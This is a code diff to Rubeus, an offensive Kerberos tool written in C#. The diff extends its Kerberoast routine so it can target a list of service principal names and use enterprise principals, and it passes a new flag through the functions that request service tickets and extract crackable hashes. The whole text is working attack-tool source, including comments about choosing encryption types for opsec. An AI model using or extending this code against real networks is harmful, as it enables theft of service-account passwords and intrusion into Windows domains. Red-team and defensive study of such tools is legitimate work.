@@ -246,7 +246,7 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, bool userStats = false)
+        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, bool userStats = false, bool enterprise = false)
         {
             if (userStats)
             {
@@ -268,6 +268,12 @@ namespace Rubeus
                 Console.WriteLine("[*] NOTICE: AES hashes will be returned for AES-enabled accounts.");
                 Console.WriteLine("[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\r\n");
             }
+            
+            if ((enterprise) && ((TGT == null) || ((String.IsNullOrEmpty(spn)) && (spns != null) && (spns.Count == 0))))
+            {
+                Console.WriteLine("[X] To use Enterprise Principals, /spn or /spns has to be specified, along with either /ticket or /tgtdeleg");
+                return;
+            }
 
             if (!String.IsNullOrEmpty(spn))
             {
@@ -277,12 +283,31 @@ namespace Rubeus
                 {
                     // if a TGT .kirbi is supplied, use that for the request
                     //      this could be a passed TGT or if TGT delegation is specified
-                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, dc, Interop.KERB_ETYPE.rc4_hmac);
+                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
                 }
                 else
                 {
                     // otherwise use the KerberosRequestorSecurityToken method
                     GetTGSRepHash(spn, "USER", "DISTINGUISHEDNAME", cred, outFile);
+                }
+            }
+            else if ((spns != null) && (spns.Count != 0))
+            {
+                foreach (string s in spns)
+                {
+                    Console.WriteLine("\r\n[*] Target SPN             : {0}", s);
+
+                    if (TGT != null)
+                    {
+                        // if a TGT .kirbi is supplied, use that for the request
+                        //      this could be a passed TGT or if TGT delegation is specified
+                        GetTGSRepHash(TGT, s, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
+                    }
+                    else
+                    {
+                        // otherwise use the KerberosRequestorSecurityToken method
+                        GetTGSRepHash(s, "USER", "DISTINGUISHEDNAME", cred, outFile);
+                    }
                 }
             }
             else {
@@ -538,12 +563,12 @@ namespace Rubeus
                                    )
                                 {
                                     // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
-                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, dc, Interop.KERB_ETYPE.rc4_hmac);
+                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
                                 }
                                 else
                                 {
                                     // otherwise don't force RC4 - have all supported encryption types for opsec reasons
-                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, dc);
+                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc);
                                 }
                             }
                             else
@@ -723,7 +748,7 @@ namespace Rubeus
             }
         }
 
-        public static void GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
+        public static void GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
         {
             // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
             string userDomain = "DOMAIN";
@@ -744,7 +769,7 @@ namespace Rubeus
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
 
             // request the new service tickt
-            byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false);
+            byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, true);
 
             if (tgsBytes != null)
             {
